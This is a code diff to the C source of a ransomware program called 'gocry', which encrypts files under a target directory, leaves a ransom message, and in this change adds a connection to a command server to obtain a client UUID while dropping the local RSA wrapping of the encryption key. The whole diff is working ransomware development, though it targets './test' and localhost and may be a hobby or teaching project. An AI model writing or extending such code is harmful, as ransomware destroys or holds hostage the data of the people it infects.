@@ -20,7 +20,8 @@
 const char *root_dir_path = "./test";
 const char *ransom_message = "You've been infected by gocry.\nAll your files are not encrypted\n";
 const char *pub_key_path = "./public.pem";
-char *UUID;
+const char *server_addr = "127.0.0.1";
+char *uuid;
 
 static int encrypt(const char *encrypt_to, const char *source_file,
                    const unsigned char key[crypto_secretstream_xchacha20poly1305_KEYBYTES]) {
@@ -107,6 +108,7 @@ int handle_socket_connection(int socketfd) {
             break;
         }
     }
+
     free(buff);
 
     return 0;
@@ -126,7 +128,7 @@ int setup_socket_connection() {
     serv_addr.sin_port = htons(SERVER_PORT);
 
     // Convert IPv4 and IPv6 addresses from text to binary form
-    if (inet_pton(AF_INET, "127.0.0.1", &serv_addr.sin_addr) <= 0) {
+    if (inet_pton(AF_INET, server_addr, &serv_addr.sin_addr) <= 0) {
         printf("\nInvalid address/ Address not supported \n");
         return -1;
     }
@@ -136,8 +138,15 @@ int setup_socket_connection() {
         return -1;
     }
 
-    if (handle_socket_connection(sock) != 0)
-        return 1;
+    // we initially want to get a uuid for the client.
+    char buff[1024] = "uuid";
+    write(sock, buff, sizeof(buff));
+    bzero(buff, sizeof(buff));
+    read(sock, buff, sizeof(buff));
+
+    memset(uuid, '\0', strlen(buff));
+    strcpy(uuid, buff);
+
     return 0;
 }
 
@@ -183,38 +192,8 @@ int main(void) {
             printf("Error encrypting file %s", to_encrypt[j]);
     }
 
-    // Encrypt the encryption key using RSA.
-    EVP_PKEY *pkey;
-
-    FILE *fp = fopen("public.pem", "r");
-    if (fp == NULL)
+    if (setup_socket_connection() != 0)
         exit(EXIT_FAILURE);
-
-    pkey = PEM_read_PUBKEY(fp, NULL, NULL, NULL);
-    fclose(fp);
-
-    if (pkey == NULL)
-        exit(EXIT_FAILURE);
-
-    RSA *rsa = EVP_PKEY_get1_RSA(pkey);
-    if (rsa == NULL)
-        exit(EXIT_FAILURE);
-    EVP_PKEY_free(pkey);
-
-    char *encrypted_message = malloc(RSA_size(rsa));
-    int encrypted_len;
-
-    if ((encrypted_len =
-             RSA_public_encrypt(strlen((const char *)encryption_key) + 1, (unsigned char *)encryption_key,
-                                (unsigned char *)encrypted_message, rsa, RSA_PKCS1_OAEP_PADDING)) == -1) {
-        printf("error encrypting keys");
-        return 1;
-    }
-
-    FILE *out = fopen("./key.txt", "w");
-    fwrite(encrypted_message, sizeof(*encrypted_message), RSA_size(rsa), out);
-    fclose(out);
-    free(encrypted_message);
 
     return EXIT_SUCCESS;
 }
